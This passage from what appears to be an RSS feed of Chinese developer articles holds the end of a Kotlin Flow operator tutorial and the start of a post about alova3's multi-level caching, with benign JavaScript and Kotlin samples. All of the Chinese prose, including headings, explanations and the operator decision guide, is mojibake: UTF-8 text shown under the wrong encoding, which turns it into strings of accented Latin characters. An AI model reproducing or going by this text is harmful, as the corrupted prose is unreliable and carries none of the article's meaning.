<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 5</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå¤„ç†å¿«é€Ÿç”¨æˆ·è¾“å…¥ï¼ˆå¦‚æœç´¢æ¡†ï¼‰ï¼Œé¿å…æ¯æ¬¡æŒ‰é”®éƒ½è§¦å‘ API è¯·æ±‚ã€‚</p>
<h3 data-id="heading-30">distinctUntilChanged</h3>
<p>æŠ‘åˆ¶ä¸å‰ä¸€ä¸ªå€¼ç›¸åŒçš„é‡å¤å‘å°„ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
        .distinctUntilChanged()
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šé˜²æ­¢ UI å› çŠ¶æ€æœªå˜è€Œè¿›è¡Œä¸å¿…è¦çš„é‡ç»„æˆ–æ›´æ–°ã€‚</p>
<hr/>
<h2 data-id="heading-31">æ ¸å¿ƒå†³ç­–æŒ‡å—</h2>
<ul>
<li>æ•°æ®è½¬æ¢ã€‚ç”¨äºä¿®æ”¹æµä¸­çš„å€¼ï¼š<code>map</code>ï¼Œ<code>filter</code>ï¼Œ<code>distinctUntilChanged</code>ã€‚</li>
<li>ç´¯ç§¯å€¼ã€‚ç”¨äºè·Ÿè¸ªçŠ¶æ€æˆ–è®¡ç®—æŒç»­ç»“æœï¼š<code>scan</code>ï¼Œ<code>runningReduce</code>ï¼Œ<code>fold</code>ï¼Œ<code>reduce</code>ã€‚</li>
<li>ä»å•ä¸€è¾“å…¥å‘å‡ºå¤šä¸ªå€¼ã€‚ç”¨äºè‡ªå®šä¹‰å‘å°„é€»è¾‘ï¼š<code>transform</code>ã€‚</li>
<li>å¤„ç†åµŒå¥—æˆ–åŠ¨æ€ <code>Flow</code>ã€‚æ ¹æ®å†…éƒ¨ <code>Flow</code> è¡Œä¸ºé€‰æ‹©ï¼š<code>flatMapConcat</code>ï¼ˆé¡ºåºæ‰§è¡Œï¼‰ã€<code>flatMapMerge</code>ï¼ˆå¹¶å‘æ‰§è¡Œï¼‰ã€<code>flatMapLatest</code>ï¼ˆå–æ¶ˆæ—§ä»»åŠ¡ï¼Œä¿ç•™æœ€æ–°ï¼‰ã€‚</li>
<li>æ€§èƒ½ä¸èƒŒå‹æ§åˆ¶ã€‚ç”¨äºä¼˜åŒ–æ”¶é›†æ•ˆç‡ä¸å“åº”æ€§ï¼š<code>buffer</code>ï¼Œ<code>conflate</code>ï¼Œ<code>collectLatest</code>ï¼Œ<code>flowOn</code>ã€‚</li>
<li>åˆå¹¶å¤šä¸ªæµã€‚ç”¨äºç»„åˆå¤šä¸ªæ•°æ®æºï¼š<code>zip</code>ï¼ˆæŒ‰é¡ºåºé…å¯¹ï¼‰ã€<code>combine</code>ï¼ˆç»„åˆæœ€æ–°å€¼ï¼‰ã€<code>merge</code>ï¼ˆäº¤é”™åˆå¹¶ï¼‰ã€‚</li>
<li>é”™è¯¯å¤„ç†ä¸å®Œæˆé€»è¾‘ã€‚ç”¨äºåº”å¯¹å¼‚å¸¸å’Œç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼š<code>catch</code>ï¼Œ<code>onCompletion</code>ï¼Œ<code>retryWhen</code>ã€‚</li>
<li>è°ƒè¯•ä¸å‰¯ä½œç”¨ã€‚ç”¨äºæ’å…¥æ—¥å¿—æˆ–å‰¯ä½œç”¨æ“ä½œï¼š<code>onEach</code>ã€‚</li>
<li>å¤„ç†é«˜é¢‘å‘å°„ã€‚ç”¨äºæŠ‘åˆ¶è¿‡å¿«çš„å‘å°„é¢‘ç‡ï¼š<code>debounce</code>ã€‚</li>
<li>è§¦å‘ <code>Flow</code> æ‰§è¡Œã€‚ç»ˆç«¯æ“ä½œç¬¦ï¼š<code>collect</code>ï¼Œ<code>collectLatest</code>ï¼Œ<code>first</code>ï¼Œ<code>single</code>ï¼Œ<code>toList</code>ï¼Œ<code>reduce</code>ï¼Œ<code>fold</code>ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ä¸ªè®©ä½ çˆ½æ­ªæ­ªçš„è¯·æ±‚å·¥å…·æ˜¯æ€æ ·çš„]]></title>    <link>https://juejin.cn/post/7581752787563413544</link>    <guid>https://juejin.cn/post/7581752787563413544</guid>    <pubDate>2025-12-10T00:35:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752787563413544" data-draft-id="7578719771588788234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ä¸ªè®©ä½ çˆ½æ­ªæ­ªçš„è¯·æ±‚å·¥å…·æ˜¯æ€æ ·çš„"/> <meta itemprop="keywords" content="Vue.js,React.js,Node.js"/> <meta itemprop="datePublished" content="2025-12-10T00:35:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤éŸµ"/> <meta itemprop="url" content="https://juejin.cn/user/1538972010422872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ä¸ªè®©ä½ çˆ½æ­ªæ­ªçš„è¯·æ±‚å·¥å…·æ˜¯æ€æ ·çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1538972010422872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤éŸµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:35:28.000Z" title="Wed Dec 10 2025 00:35:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    46
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å„ä½å¥½ï¼Œå¾ˆä¹…æ²¡å‡ºæ¥å‘ä¸€å‘alovaæ–‡ç« äº†ï¼Œç°åœ¨çš„alovaå·²ç»æ›´æ–°åˆ°ç¬¬3ä¸ªå¤§ç‰ˆæœ¬äº†ï¼Œçœ‹è¿™ç¯‡æ–‡ç« å¯èƒ½ä¼šè®©ä½ å¯¹å®ƒæœ‰ä¸ªå…¨æ–°çš„è®¤è¯†ã€‚</p>
<p>å¦‚æœä½ ä¹‹å‰äº†è§£è¿‡alovaï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡çŸ¥é“alovaæ˜¯ä¸€ä¸ªè½»é‡çº§çš„è¯·æ±‚ç­–ç•¥åº“ï¼Œé€šè¿‡å®ƒçš„å®¢æˆ·ç«¯è¯·æ±‚hookså’Œç¼“å­˜é«˜æ•ˆåœ°å¤„ç†å‰ç«¯æ•°æ®è¯·æ±‚ã€‚</p>
<p>è€Œåˆ°ä»Šå¤©ï¼Œalova3åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†æ›´å¤§çš„æå‡ï¼Œå®ƒä¸åªæ˜¯åœ¨å®¢æˆ·ç«¯ä¸­ä½¿ç”¨ï¼Œç°åœ¨è¿˜èƒ½åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸‹å¤§æ”¾å¼‚å½©ï¼Œæ˜¯ä¸€ä¸ª<strong>å…¨æ ˆå¼çš„æè‡´é«˜æ•ˆçš„è¯·æ±‚å·¥å…·é›†</strong>ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯å¸®åŠ©å¼€å‘å›¢é˜Ÿæ›´é«˜æ•ˆåœ°é›†æˆå’Œè°ƒç”¨APIï¼Œå¹¶ä¸”å®Œç¾å…¼å®¹fetchã€axiosç­‰HTTPå®¢æˆ·ç«¯ï¼Œä»¥åŠreactã€vueã€svelteç­‰UIæ¡†æ¶ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œalova3ç›¸æ¯”ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå®ƒå¸¦æ¥äº†ä»¥ä¸‹çš„å¤§æ›´æ–°ã€‚</p>
<ol>
<li>å¤šçº§ç¼“å­˜ï¼šè¯·æ±‚æ•ˆç‡å’Œå‡å‹åˆ©å™¨ã€‚</li>
<li>å…¨æ ˆçš„è¯·æ±‚ç­–ç•¥ï¼šå¸®ä½ å¤§å¤§å‡å°‘è¯·æ±‚ä»£ç ã€‚</li>
<li>æ›´åŠ ç°ä»£åŒ–çš„OpenAPIå·¥å…·ï¼šä¸ä»…å¯ä»¥è‡ªåŠ¨ç”Ÿæˆè¯·æ±‚ä»£ç ï¼Œè¿˜èƒ½æŠŠapiæ–‡æ¡£æ¬åˆ°ç¼–è¾‘å™¨ä¸­ï¼Œäº¤äº’å¼åœ°è°ƒç”¨apiï¼Œæ‰“ç ´è¿‡å»çš„apié›†æˆæµç¨‹ã€‚</li>
</ol>
<p><strong>è¿™é‡Œæˆ‘æƒ³éƒ‘é‡å£°æ˜ä¸€ä¸‹ï¼Œç”±äºaiå¤§æ¨¡å‹å¯¹alovaçŸ¥è¯†å­¦ä¹ çš„ä¸è¶³ï¼Œç°åœ¨ç½‘ä¸Šå……æ–¥ç€å„ç§aiç¼–å†™çš„alovaçš„é”™è¯¯ä½¿ç”¨çš„æ–‡ç« ï¼Œå»ºè®®å¤§å®¶å‰å¾€<a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org" target="_blank" title="https://alova.js.org" ref="nofollow noopener noreferrer">alovaå®˜ç½‘</a>äº†è§£alovaçš„æ­£ç¡®ä½¿ç”¨æ–¹æ³•ã€‚</strong></p>
<h2 data-id="heading-0">ä¸€ã€å¤šçº§ç¼“å­˜</h2>
<p>å¤šçº§ç¼“å­˜æœºåˆ¶å¯ä»¥ä¸ºä½ çš„æœåŠ¡ç«¯åº”ç”¨æä¾›æœ€å¿«çš„è¯·æ±‚ä½“éªŒã€‚ä½ å¯ä»¥è‡ªç”±é€‰æ‹©å•çº§ç¼“å­˜è¿˜æ˜¯å¤šçº§ç¼“å­˜ä½¿ç”¨ï¼Œå®ƒä»¬è¿è¡Œæœºåˆ¶å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·è¯·æ±‚] --&gt; B{æ£€æŸ¥L1ç¼“å­˜}
    B --&gt;|å‘½ä¸­| C[è¿”å›æ•°æ®]
    B --&gt;|æœªå‘½ä¸­| D{æ£€æŸ¥L2ç¼“å­˜}
    D --&gt;|å‘½ä¸­| E[æ›´æ–°L1ç¼“å­˜]
    D --&gt;|æœªå‘½ä¸­| F[è¯·æ±‚APIæ¥å£]
    F --&gt; G[æ›´æ–°L2ç¼“å­˜]
    E --&gt; C
    G --&gt; E
    C --&gt; H[ç»“æŸ]
</code></pre>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œalova çš„ä¸€çº§ç¼“å­˜æ˜¯ç®€å•çš„ object ä»¥ key-value çš„æ–¹å¼ç¼“å­˜ï¼Œè€ŒäºŒçº§ç¼“å­˜åœ¨ä¸åŒç¯å¢ƒä¸‹çš„é»˜è®¤è¡¨ç°ä¹Ÿä¸åŒï¼Œå…·ä½“çœ‹ä¸‹é¢ã€‚</p>
<h3 data-id="heading-1">å®¢æˆ·ç«¯</h3>
<p>åœ¨å®¢æˆ·ç«¯ç¯å¢ƒä¸‹ï¼Œä¸€çº§ç¼“å­˜ä¸€èˆ¬ç”¨äºçŸ­æ—¶çš„è¯·æ±‚æ•°æ®ç¼“å­˜ï¼Œä¾‹å¦‚å‡ åˆ†é’Ÿæˆ–å‡ ç§’é’Ÿçš„é¢‘ç¹è¯·æ±‚ç›¸åŒæ•°æ®å¸¦æ¥çš„æ€§èƒ½æ¶ˆè€—ï¼Œå½“ä½ åœ¨å†™ todo è¯¦æƒ…é¡µçš„æ—¶å€™ï¼Œä½ å¯èƒ½ä¼šæƒ³åˆ°ç”¨æˆ·ä¼šé¢‘ç¹åœ¨ todo åˆ—è¡¨ä¸­ç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ï¼Œæ­¤æ—¶ä½¿ç”¨ä¸€çº§ç¼“å­˜å¯ä»¥å¤§å¤§æå‡æ•ˆç‡ï¼Œé™ä½æœåŠ¡ç«¯å‹åŠ›ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯¹è¯¦æƒ…æ•°æ®è®¾ç½®60ç§’çš„ä¸€çº§ç¼“å­˜</span>
alovaInstance.<span class="hljs-title class_">Get</span>(<span class="hljs-string">'/todo/detail'</span>, {
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-string">'xxx'</span>
  },
  <span class="hljs-attr">cacheFor</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// è®¾ç½®60ç§’çš„ä¸€çº§ç¼“å­˜</span>
  <span class="hljs-comment">// ...</span>
});
</code></pre>
<p>è€ŒäºŒçº§ç¼“å­˜å¯ç”¨äºä¸€äº›æšä¸¾æ•°æ®ã€èŠ‚æ—¥ç­‰é•¿æœŸä¸å˜çš„è¯·æ±‚ä¸ºä¸»ï¼Œé»˜è®¤ä½¿ç”¨<code>localStorage</code>å­˜å‚¨ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯¹æšä¸¾æ•°æ®è®¾ç½®3å¤©ç¼“å­˜æ—¶é—´</span>
alovaInstance.<span class="hljs-title class_">Get</span>(<span class="hljs-string">'/config/enum'</span>, {
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">key</span>: <span class="hljs-string">'xxx'</span>
  },
  <span class="hljs-attr">cacheFor</span>: {
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'restore'</span>,
    <span class="hljs-attr">expire</span>: <span class="hljs-number">3</span> * <span class="hljs-number">24</span> * <span class="hljs-number">3600</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// ç¼“å­˜3å¤©æ—¶é—´</span>
  }, 
});
</code></pre>
<h3 data-id="heading-2">æœåŠ¡ç«¯</h3>
<p>åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸‹ï¼Œå¤šçº§ç¼“å­˜æœºåˆ¶ç‰¹åˆ«é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<ol>
<li>
<p><strong>é«˜è®¿é—®é¢‘ç‡å’Œä½å»¶è¿Ÿéœ€æ±‚</strong>ï¼šä¾‹å¦‚çƒ­é—¨æ–°é—»ã€å•†å“è¯¦æƒ…ï¼Œå¯ä»¥è¿›ä¸€æ­¥å‡å°‘ç½‘ç»œå¼€é”€ï¼Œåœ¨ç½‘ç»œä¸ç¨³å®šæ—¶ä¹Ÿä¿æŒæ›´å¿«çš„å“åº”ã€‚</p>
</li>
<li>
<p><strong>å‡è½»ä¸‹æ¸¸æœåŠ¡å™¨å‹åŠ›</strong>ï¼šä¾‹å¦‚æœ‰è®¿é—®é«˜å³°æœŸçš„æœåŠ¡ï¼Œä¸Šå±‚ç¼“å­˜å¯ä»¥æœ‰æ•ˆå‡å°‘å¯¹åç«¯æ•°æ®åº“å’Œå¾®æœåŠ¡çš„å‹åŠ›ã€‚</p>
</li>
<li>
<p><strong>æ•´åˆå¤šä¸ªä¸‹æ¸¸æœåŠ¡å™¨çš„æ•°æ®åˆå¹¶å’Œå¤„ç†</strong>ï¼šå¤šä¸ªä¸²è¡Œè¯·æ±‚å¯èƒ½å¯¼è‡´æ›´é•¿çš„å“åº”æ—¶é—´ï¼Œä¹Ÿå¯èƒ½å› å¤æ‚çš„æ•°æ®è½¬æ¢æ¶ˆè€—æ€§èƒ½ï¼Œå¯å°†è½¬æ¢åçš„æ•°æ®è¿›è¡Œç¼“å­˜ã€‚</p>
</li>
<li>
<p><strong>API é€Ÿç‡é™åˆ¶å’Œè®¡è´¹</strong>ï¼šå¤©æ°”é¢„æŠ¥æœåŠ¡ API æ¯å°æ—¶æ›´æ–°ä¸€æ¬¡å¤©æ°”ä¿¡æ¯ï¼Œåœ°ç†ä½ç½®æ•°æ® API ç­‰ã€‚</p>
</li>
<li>
<p><strong>é‰´æƒæ•°æ®</strong>ï¼šç”¨æˆ·tokenç­‰æ•°æ®ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œé¿å…é¢‘ç¹çš„é‰´æƒæ“ä½œã€‚</p>
</li>
<li>
<p><strong>è¯·æ±‚é€Ÿç‡é™åˆ¶ç­‰åˆ†å¸ƒå¼æ•°æ®</strong>ï¼šç”¨æˆ·çš„è¯·æ±‚æ¬¡æ•°é™åˆ¶ç­‰æ•°æ®ã€‚</p>
</li>
</ol>
<p>å…·ä½“å¯ä»¥çœ‹<a href="https://juejin.cn/post/7578820431018622991?share_token=0ebefce4-4817-450a-bae9-191040529eb6" target="_blank" title="https://juejin.cn/post/7578820431018622991?share_token=0ebefce4-4817-450a-bae9-191040529eb6">è¿™ç¯‡æ–‡ç« </a></p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨è¿›ç¨‹é—´å†…å­˜å…±äº«é€‚é…å™¨åŠ  LRU cache ä½œä¸ºä¸€çº§ç¼“å­˜ï¼Œredis ä½œä¸ºäºŒçº§ç¼“å­˜çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { createPSCAdapter, <span class="hljs-title class_">NodeSyncAdapter</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@alova/psc'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">LRUCache</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lru-cache'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">RedisStorageAdapter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./adapter-redis'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">lRUCache</span>(<span class="hljs-params">options = {}</span>) {
  <span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LRUCache</span>(options);
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">set</span>(key, value);
    },

    <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(key);
    },

    <span class="hljs-title function_">remove</span>(<span class="hljs-params">key</span>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">delete</span>(key);
    },

    <span class="hljs-title function_">clear</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">clear</span>();
    }
  };
}

<span class="hljs-keyword">const</span> alovaInstance = <span class="hljs-title function_">createAlova</span>({
  <span class="hljs-comment">// ...</span>

  <span class="hljs-comment">// è¿›ç¨‹é—´å…±äº«ç¼“å­˜é€‚é…å™¨</span>
  <span class="hljs-attr">l1Cache</span>: <span class="hljs-title function_">createPSCAdapter</span>(
    <span class="hljs-title class_">NodeSyncAdapter</span>(),
    <span class="hljs-title function_">lRUCache</span>({
      <span class="hljs-attr">max</span>: <span class="hljs-number">1000</span>,
      <span class="hljs-attr">ttl</span>: <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">10</span>
    })
  ),

  <span class="hljs-comment">// redisç¼“å­˜é€‚é…å™¨</span>
  <span class="hljs-attr">l2Cache</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisStorageAdapter</span>({
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>,
    <span class="hljs-attr">username</span>: <span class="hljs-string">'default'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">'my-top-secret'</span>,
    <span class="hljs-attr">db</span>: <span class="hljs-number">0</span>
  })
});
</code></pre>
<p>é€šè¿‡å¤šçº§ç¼“å­˜æœºåˆ¶ï¼Œalova3èƒ½å¤Ÿå®ç°ï¼š</p>
<ul>
<li><strong>å“åº”æ—¶é—´å‡å°‘80%+</strong>ï¼šé€šè¿‡å†…å­˜ç¼“å­˜å®ç°æ¯«ç§’çº§å“åº”</li>
<li><strong>æœåŠ¡å™¨è´Ÿè½½é™ä½60%+</strong>ï¼šå‡å°‘ä¸å¿…è¦çš„APIè°ƒç”¨</li>
<li><strong>ç¦»çº¿ä½“éªŒä¼˜åŒ–</strong>ï¼šæŒä¹…åŒ–ç¼“å­˜æ”¯æŒå®Œæ•´çš„ç¦»çº¿åŠŸèƒ½</li>
<li><strong>å¸¦å®½èŠ‚çº¦</strong>ï¼šå‡å°‘é‡å¤æ•°æ®ä¼ è¾“</li>
</ul>
<p>è¿™ç§å¤šçº§ç¼“å­˜æ¶æ„ä½¿å¾—alova3ç‰¹åˆ«é€‚åˆéœ€è¦é«˜æ€§èƒ½æ•°æ®è®¿é—®çš„ç°ä»£Webåº”ç”¨ï¼Œåœ¨å¾®æœåŠ¡æ¶æ„å’Œåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¹Ÿè¡¨ç°å‡ºè‰²ã€‚</p>
<h2 data-id="heading-3">äºŒã€å…¨æ ˆçš„è¯·æ±‚ç­–ç•¥</h2>
<h3 data-id="heading-4">æœåŠ¡ç«¯è¯·æ±‚ç­–ç•¥</h3>
<p>alova3ä¸€ä¸ªå…³é”®ç‰¹æ€§æ˜¯å¼•å…¥äº†å¯¹æœåŠ¡ç«¯çš„å®Œæ•´æ”¯æŒï¼Œä½ ä¸ä»…å¯ä»¥åœ¨nodejsã€denoã€bunç­‰è¿è¡Œæ—¶ä¸­ä½¿ç”¨ï¼Œè¿˜æä¾›äº†ç‹¬æœ‰çš„æœåŠ¡ç«¯è¯·æ±‚ç­–ç•¥ï¼Œç®€ç§°server hooksï¼Œå®ƒå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¤„ç†åˆ†å¸ƒå¼çš„BFFã€APIç½‘å…³ã€ç¬¬ä¸‰æ–¹tokenç®¡ç†ç­‰ï¼ŒåŒæ—¶è¿˜æœ‰è¯·æ±‚é€Ÿç‡é™åˆ¶ã€è¯·æ±‚é‡è¯•ã€éªŒè¯ç å‘é€ä¸æ ¡éªŒç­‰æ¨¡å—ï¼Œå¯ä»¥å¿«é€Ÿå®ç°åˆ†å¸ƒå¼çš„ç‰¹å®šä¸šåŠ¡é€»è¾‘ã€‚</p>
<p>BFFã€APIç½‘å…³ã€ç¬¬ä¸‰æ–¹tokenç®¡ç†ç­‰ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.alova.cn%2Fdocs%2Fserver-hooks" target="_blank" title="https://www.alova.cn/docs/server-hooks" ref="nofollow noopener noreferrer">è¿™ç¯‡æ–‡ç« </a>ä¸­æœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œè¿™è¾¹æˆ‘ä»¬æ¥çœ‹çœ‹éªŒè¯ç å‘é€æ ¡éªŒæ¨¡å—çš„ä½¿ç”¨ã€‚</p>
<p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªalovaå®ä¾‹ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { createAlova } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'alova/server'</span>);
